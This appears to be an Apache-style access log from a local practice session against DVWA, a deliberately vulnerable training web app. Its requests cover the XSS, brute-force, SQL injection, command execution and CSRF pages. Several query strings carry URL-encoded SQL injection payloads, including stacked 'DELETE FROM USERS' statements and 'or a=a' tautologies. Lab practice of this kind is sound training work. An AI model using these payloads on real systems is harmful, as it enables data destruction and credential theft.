0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:26 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:40 +0000] "POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 5258 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:41 +0000] "POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 5361 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:41 +0000] "GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:41 +0000] "GET /dvwa/dvwa/css/main.css HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:41 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:44 +0000] "POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 5464 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:44 +0000] "GET /dvwa/dvwa/css/main.css HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:44 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:32:44 +0000] "GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1" 304 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:33:01 +0000] "GET /dvwa/ HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:33:01 +0000] "GET /dvwa/login.php HTTP/1.1" 200 1224 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:33:01 +0000] "GET /dvwa/dvwa/images/login_logo.png HTTP/1.1" 200 12875 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:33:01 +0000] "GET /dvwa/dvwa/css/login.css HTTP/1.1" 200 608 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:33:01 +0000] "GET /favicon.ico HTTP/1.1" 503 1318 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:33:17 +0000] "POST /dvwa/login.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:33:17 +0000] "GET /dvwa/login.php HTTP/1.1" 200 1263 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:33:20 +0000] "POST /dvwa/login.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:33:20 +0000] "GET /dvwa/index.php HTTP/1.1" 200 4704 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:33:20 +0000] "GET /dvwa/dvwa/css/main.css HTTP/1.1" 200 3945 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:33:20 +0000] "GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1" 200 775 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:33:20 +0000] "GET /dvwa/dvwa/images/logo.png HTTP/1.1" 200 6749 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:33:20 +0000] "GET /dvwa/favicon.ico HTTP/1.1" 200 1406 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:33:23 +0000] "GET /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 5464 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:34:01 +0000] "GET /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 5464 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:34:02 +0000] "GET /dvwa/vulnerabilities/xss_r/ HTTP/1.1" 200 4453 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:34:02 +0000] "GET /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 5464 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:34:08 +0000] "GET /dvwa/ HTTP/1.1" 200 4617 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:34:10 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3677 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:34:11 +0000] "POST /dvwa/setup.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:34:11 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 4039 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:34:12 +0000] "GET /dvwa/ HTTP/1.1" 200 4617 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:34:25 +0000] "GET /dvwa/security.php HTTP/1.1" 200 4228 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:34:59 +0000] "GET /dvwa/security.php HTTP/1.1" 200 4228 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:36:26 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3677 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:36:31 +0000] "GET /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 4896 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:36:27 +0000] "POST /dvwa/setup.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:36:32 +0000] "GET /dvwa/vulnerabilities/xss_r/ HTTP/1.1" 200 4815 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:36:35 +0000] "GET /dvwa/vulnerabilities/xss_s/ HTTP/1.1" 200 4987 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:36:52 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 3677 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:36:53 +0000] "POST /dvwa/setup.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:36:55 +0000] "GET /dvwa/setup.php HTTP/1.1" 200 4039 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:36:56 +0000] "GET /dvwa/vulnerabilities/brute/ HTTP/1.1" 200 4658 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:37:00 +0000] "GET /dvwa/vulnerabilities/brute/?username=testa&password=qwe&Login=Login HTTP/1.1" 200 4708 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:37:02 +0000] "GET /dvwa/vulnerabilities/brute/?username=asd&password=asd&Login=Login HTTP/1.1" 200 4708 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:37:06 +0000] "GET /dvwa/vulnerabilities/brute/?username=qwe&password=qwe&Login=Login HTTP/1.1" 200 4708 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:37:09 +0000] "GET /dvwa/vulnerabilities/brute/?username=ac&password=qwe&Login=Login HTTP/1.1" 200 4708 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:37:10 +0000] "GET /dvwa/vulnerabilities/brute/?username=zxv&password=zxv&Login=Login HTTP/1.1" 200 4708 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:37:12 +0000] "GET /dvwa/vulnerabilities/brute/?username=qwe&password=qwe&Login=Login HTTP/1.1" 200 4708 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:37:14 +0000] "GET /dvwa/vulnerabilities/brute/?username=qweqweqwe&password=zxvafsad&Login=Login HTTP/1.1" 200 4708 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:37:16 +0000] "GET /dvwa/vulnerabilities/view_source.php?id=brute&security=low HTTP/1.1" 200 3950 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:38:14 +0000] "GET /dvwa/vulnerabilities/view_help.php?id=brute&security=low HTTP/1.1" 200 1792 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:38:28 +0000] "GET /dvwa/vulnerabilities/view_help.php?id=brute&security=low HTTP/1.1" 200 1792 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:38:55 +0000] "GET /dvwa/vulnerabilities/view_source.php?id=brute&security=low HTTP/1.1" 200 3950 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:39:06 +0000] "GET /dvwa/vulnerabilities/view_source_all.php?id=brute HTTP/1.1" 200 11838 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:41:23 +0000] "GET /dvwa/vulnerabilities/view_source.php?id=brute&security=low HTTP/1.1" 200 3950 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:41:25 +0000] "GET /dvwa/vulnerabilities/view_source_all.php?id=brute HTTP/1.1" 200 11838 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:41:35 +0000] "GET /dvwa/security.php HTTP/1.1" 200 4228 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:41:37 +0000] "POST /dvwa/security.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:41:37 +0000] "GET /dvwa/security.php HTTP/1.1" 200 4314 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:41:38 +0000] "GET /dvwa/vulnerabilities/brute/ HTTP/1.1" 200 4661 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:41:41 +0000] "GET /dvwa/vulnerabilities/brute/?username=qweqwe&password=qwe&Login=Login HTTP/1.1" 200 4711 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:41:47 +0000] "GET /dvwa/vulnerabilities/brute/?username=add&password=sad&Login=Login HTTP/1.1" 200 4711 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:41:52 +0000] "GET /dvwa/vulnerabilities/brute/?username=cvbcvb&password=cvbcvb&Login=Login HTTP/1.1" 200 4711 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:41:57 +0000] "GET /dvwa/vulnerabilities/brute/?username=werwerwe&password=ewrwer&Login=Login HTTP/1.1" 200 4711 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:42:03 +0000] "GET /dvwa/vulnerabilities/brute/?username=cvbcvbvc&password=werwerwe&Login=Login HTTP/1.1" 200 4711 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:42:08 +0000] "GET /dvwa/about.php HTTP/1.1" 200 6103 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:42:09 +0000] "GET /dvwa/security.php HTTP/1.1" 200 4230 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:42:11 +0000] "POST /dvwa/security.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:42:11 +0000] "GET /dvwa/security.php HTTP/1.1" 200 4311 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:42:12 +0000] "GET /dvwa/vulnerabilities/brute/ HTTP/1.1" 200 4658 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:44:17 +0000] "GET /dvwa/vulnerabilities/brute/ HTTP/1.1" 200 4658 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:44:39 +0000] "GET /dvwa/vulnerabilities/view_help.php?id=brute&security=low HTTP/1.1" 200 1792 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:46:07 +0000] "GET /dvwa/vulnerabilities/brute/?username=qweqwe&password=asd&Login=Login HTTP/1.1" 200 4708 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:46:09 +0000] "GET /dvwa/vulnerabilities/brute/?username=zxc&password=qwe&Login=Login HTTP/1.1" 200 4708 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:46:11 +0000] "GET /dvwa/vulnerabilities/brute/?username=ertr&password=retret&Login=Login HTTP/1.1" 200 4708 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:46:13 +0000] "GET /dvwa/vulnerabilities/brute/?username=qweqw&password=xcbxcbxcb&Login=Login HTTP/1.1" 200 4708 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:46:55 +0000] "GET /dvwa/vulnerabilities/view_source.php?id=brute&security=low HTTP/1.1" 200 3950 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:47:42 +0000] "GET /dvwa/security.php HTTP/1.1" 200 4228 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:47:44 +0000] "POST /dvwa/security.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:47:44 +0000] "GET /dvwa/security.php HTTP/1.1" 200 4314 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:47:46 +0000] "GET /dvwa/vulnerabilities/brute/ HTTP/1.1" 200 4661 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:47:48 +0000] "GET /dvwa/vulnerabilities/view_source.php?id=brute&security=high HTTP/1.1" 200 4863 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:47:53 +0000] "GET /dvwa/vulnerabilities/view_source_all.php?id=brute HTTP/1.1" 200 11838 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:48:34 +0000] "GET /dvwa/vulnerabilities/view_source.php?id=brute&security=high HTTP/1.1" 200 4863 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:48:45 +0000] "GET /dvwa/vulnerabilities/view_source_all.php?id=brute HTTP/1.1" 200 11838 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:50:40 +0000] "GET /dvwa/vulnerabilities/brute/?username=admin&password=password&Login=Login HTTP/1.1" 200 4772 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:51:09 +0000] "GET /dvwa/vulnerabilities/view_source_all.php?id=brute HTTP/1.1" 200 11838 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:53:19 +0000] "GET /dvwa/vulnerabilities/brute/?username=%3B%27DELETE+FROM+USER%3B%27&password=&Login=Login HTTP/1.1" 200 4711 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:53:26 +0000] "GET /dvwa/security.php HTTP/1.1" 200 4230 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:53:27 +0000] "POST /dvwa/security.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:53:27 +0000] "GET /dvwa/security.php HTTP/1.1" 200 4311 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:53:29 +0000] "GET /dvwa/vulnerabilities/brute/ HTTP/1.1" 200 4658 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:53:48 +0000] "GET /dvwa/vulnerabilities/brute/?username=%27%3BDELETE+FROM+USER%3B%27&password=&Login=Login HTTP/1.1" 200 224 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:54:52 +0000] "GET /dvwa/vulnerabilities/brute/?username=%27%3BDELETE+FROM+USER%3BSELECT+*+FROM+USERS+WHERE+USER%3D%27%27%27&password=&Login=Login HTTP/1.1" 200 237 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:55:40 +0000] "GET /dvwa/vulnerabilities/brute/?username=%27%3BDELETE+FROM+USER%3BSELECT+*+FROM+USERS+WHERE+USER%3D%27&password=&Login=Login HTTP/1.1" 200 237 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:56:11 +0000] "GET /dvwa/vulnerabilities/brute/?username=%27%3BDELETE+FROM+%C2%B4users%C2%B4%3BSELECT+*+FROM+%C2%B4users%C2%B4+WHERE+USER%3D%27&password=&Login=Login HTTP/1.1" 200 229 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:56:23 +0000] "GET /dvwa/vulnerabilities/brute/?username=%27%3BDELETE+FROM+USERS%3BSELECT+*+FROM+USERS+WHERE+USER%3D%27&password=&Login=Login HTTP/1.1" 200 237 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:13:56:41 +0000] "GET /dvwa/vulnerabilities/brute/?username=%27%3BDELETE+FROM+USERS%3BSELECT+*+FROM+USERS+WHERE+USER%3D%27&password=&Login=Login HTTP/1.1" 200 237 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:00:14 +0000] "GET /dvwa/vulnerabilities/brute/ HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:00:14 +0000] "GET /dvwa/login.php HTTP/1.1" 200 1224 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:00:18 +0000] "POST /dvwa/login.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:00:18 +0000] "GET /dvwa/index.php HTTP/1.1" 200 4704 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:00:20 +0000] "GET /dvwa/vulnerabilities/brute/ HTTP/1.1" 200 4658 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:00:24 +0000] "GET /dvwa/vulnerabilities/brute/?username=&password=&Login=Login HTTP/1.1" 200 4708 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:00:26 +0000] "GET /dvwa/vulnerabilities/view_source.php?id=brute&security=low HTTP/1.1" 200 3950 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:00:39 +0000] "GET /dvwa/vulnerabilities/brute/?username=%27%3B&password=&Login=Login HTTP/1.1" 200 206 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:01:21 +0000] "GET /dvwa/vulnerabilities/brute/?username=%27+AND+TRUE&password=&Login=Login HTTP/1.1" 200 206 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:01:36 +0000] "GET /dvwa/vulnerabilities/brute/?username=%27+AND+user%3Duser&password=&Login=Login HTTP/1.1" 200 206 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:01:56 +0000] "GET /dvwa/vulnerabilities/brute/?username=%27&password=&Login=Login HTTP/1.1" 200 190 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:02:45 +0000] "GET /dvwa/vulnerabilities/brute/?username=%27+OR+user+%3D+user+OR+user+%3D+%27&password=&Login=Login HTTP/1.1" 200 4708 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:03:06 +0000] "GET /dvwa/vulnerabilities/brute/?username=%27&password=&Login=Login HTTP/1.1" 200 190 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:03:12 +0000] "GET /dvwa/vulnerabilities/sqli/ HTTP/1.1" 200 4711 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:03:14 +0000] "GET /dvwa/vulnerabilities/view_source.php?id=sqli&security=low HTTP/1.1" 200 3298 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:03:16 +0000] "GET /dvwa/vulnerabilities/view_help.php?id=sqli&security=low HTTP/1.1" 200 1834 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:03:59 +0000] "GET /dvwa/vulnerabilities/view_source.php?id=sqli&security=low HTTP/1.1" 200 3298 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:04:12 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 200 4766 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:04:38 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27%3B&Submit=Submit HTTP/1.1" 200 158 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:05:17 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27%3BSELECT+password+FROM+users+WHERE+user_id+%3D+%271&Submit=Submit HTTP/1.1" 200 203 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:05:28 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27%3BSELECT+password+FROM+users+WHERE+user_id+%3D+%271%3B&Submit=Submit HTTP/1.1" 200 204 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:05:41 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27%3BSELECT+password+FROM+users+WHERE+user_id+%3D+%271&Submit=Submit HTTP/1.1" 200 203 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:06:23 +0000] "GET /dvwa/vulnerabilities/view_help.php?id=sqli&security=low HTTP/1.1" 200 1834 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:06:48 +0000] "GET /dvwa/vulnerabilities/view_source_all.php?id=sqli HTTP/1.1" 200 8900 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:07:05 +0000] "GET /dvwa/vulnerabilities/sqli/?id=%27&Submit=Submit HTTP/1.1" 200 160 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:07:33 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%3BSELECT+*+FROM+USERS%3B&Submit=Submit HTTP/1.1" 200 4787 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:07:56 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 200 4766 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:08:03 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27&Submit=Submit HTTP/1.1" 200 161 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:08:34 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1%27%3BSELECT+first_name+FROM+users+WHERE+user_id+%3D+%27&Submit=Submit HTTP/1.1" 200 204 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:10:06 +0000] "GET /dvwa/vulnerabilities/sqli/?id=SELECT+1&Submit=Submit HTTP/1.1" 200 4711 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:10:22 +0000] "GET /dvwa/vulnerabilities/sqli/?id=SELECT+%40%40version%3B&Submit=Submit HTTP/1.1" 200 4711 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:10:47 +0000] "GET /dvwa/vulnerabilities/sqli/?id=hi%27+or+1+%3D%3D+1&Submit=Submit HTTP/1.1" 200 162 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:11:00 +0000] "GET /dvwa/vulnerabilities/sqli/?id=hi%27+or+1+%3D%3D+%271&Submit=Submit HTTP/1.1" 200 163 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:11:03 +0000] "GET /dvwa/vulnerabilities/sqli/?id=hi%27+or+1+%3D%3D+%271&Submit=Submit HTTP/1.1" 200 163 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:11:16 +0000] "GET /dvwa/vulnerabilities/sqli/?id=hi%27+or+1+%3D%3D+%271--&Submit=Submit HTTP/1.1" 200 165 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:11:22 +0000] "GET /dvwa/vulnerabilities/sqli/?id=hi%27+or+1+%3D%3D+1--&Submit=Submit HTTP/1.1" 200 164 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:12:16 +0000] "GET /dvwa/vulnerabilities/sqli/?id=hi%27+or+1+%3D%3D+1%23&Submit=Submit HTTP/1.1" 200 163 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:12:26 +0000] "GET /dvwa/vulnerabilities/sqli/?id=%23&Submit=Submit HTTP/1.1" 200 4711 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:12:27 +0000] "GET /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1" 200 4766 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:13:00 +0000] "GET /dvwa/vulnerabilities/sqli/?id=%27+or+%27a%27%3D%27a&Submit=Submit HTTP/1.1" 200 5033 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:15:11 +0000] "GET /dvwa/vulnerabilities/sqli/?id=%27+DELETE+FROM+USER+WHERE+%27a%27%3D%27a&Submit=Submit HTTP/1.1" 200 187 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:15:18 +0000] "GET /dvwa/vulnerabilities/sqli/?id=%27%3B+DELETE+FROM+USER+WHERE+%27a%27%3D%27a&Submit=Submit HTTP/1.1" 200 187 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:15:40 +0000] "GET /dvwa/vulnerabilities/sqli/?id=%27%3B&Submit=Submit HTTP/1.1" 200 158 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:16:09 +0000] "GET /dvwa/vulnerabilities/brute/ HTTP/1.1" 200 4658 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:19:46 +0000] "GET /dvwa/vulnerabilities/exec/ HTTP/1.1" 200 4467 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:19:47 +0000] "GET /dvwa/vulnerabilities/view_help.php?id=exec&security=low HTTP/1.1" 200 1601 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:20:28 +0000] "POST /dvwa/vulnerabilities/exec/ HTTP/1.1" 200 4505 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:20:36 +0000] "POST /dvwa/vulnerabilities/exec/ HTTP/1.1" 200 4505 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:20:45 +0000] "POST /dvwa/vulnerabilities/exec/ HTTP/1.1" 200 5125 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:20:55 +0000] "POST /dvwa/vulnerabilities/exec/ HTTP/1.1" 200 5125 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:21:08 +0000] "POST /dvwa/vulnerabilities/exec/ HTTP/1.1" 200 6354 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:21:31 +0000] "POST /dvwa/vulnerabilities/exec/ HTTP/1.1" 200 4518 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:21:36 +0000] "POST /dvwa/vulnerabilities/exec/ HTTP/1.1" 200 4845 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:21:40 +0000] "GET /dvwa/vulnerabilities/view_source.php?id=exec&security=low HTTP/1.1" 200 2792 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:21:43 +0000] "GET /dvwa/vulnerabilities/view_source_all.php?id=exec HTTP/1.1" 200 10269 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:22:16 +0000] "POST /dvwa/vulnerabilities/exec/ HTTP/1.1" 200 5125 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:22:26 +0000] "POST /dvwa/vulnerabilities/exec/ HTTP/1.1" 200 4873 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:22:37 +0000] "POST /dvwa/vulnerabilities/exec/ HTTP/1.1" 200 5748 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:22:50 +0000] "POST /dvwa/vulnerabilities/exec/ HTTP/1.1" 200 4532 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:22:59 +0000] "POST /dvwa/vulnerabilities/exec/ HTTP/1.1" 200 4532 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:23:07 +0000] "POST /dvwa/vulnerabilities/exec/ HTTP/1.1" 200 5125 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:29:42 +0000] "GET /dvwa/vulnerabilities/csrf/ HTTP/1.1" 200 4712 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:29:43 +0000] "GET /dvwa/vulnerabilities/csrf/ HTTP/1.1" 200 4712 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:29:46 +0000] "GET /dvwa/vulnerabilities/view_help.php?id=csrf&security=low HTTP/1.1" 200 1469 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:30:07 +0000] "GET /dvwa/vulnerabilities/view_source.php?id=csrf&security=low HTTP/1.1" 200 2934 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:30:14 +0000] "GET /dvwa/vulnerabilities/view_source.php?id=csrf&security=low HTTP/1.1" 200 2934 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:32:06 +0000] "GET /dvwa/vulnerabilities/view_source_all.php?id=csrf HTTP/1.1" 200 9542 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:32:27 +0000] "GET /dvwa/security.php HTTP/1.1" 200 4228 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:32:29 +0000] "POST /dvwa/security.php HTTP/1.1" 302 0 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:32:29 +0000] "GET /dvwa/security.php HTTP/1.1" 200 4314 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:32:30 +0000] "GET /dvwa/vulnerabilities/csrf/ HTTP/1.1" 200 4810 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:32:34 +0000] "GET /dvwa/security.php HTTP/1.1" 200 4230 
0:0:0:0:0:0:0:1%0 -  -  [29/Sep/2014:14:32:36 +0000] "POST /dvwa/security.php HTTP/1.1" 302 0 
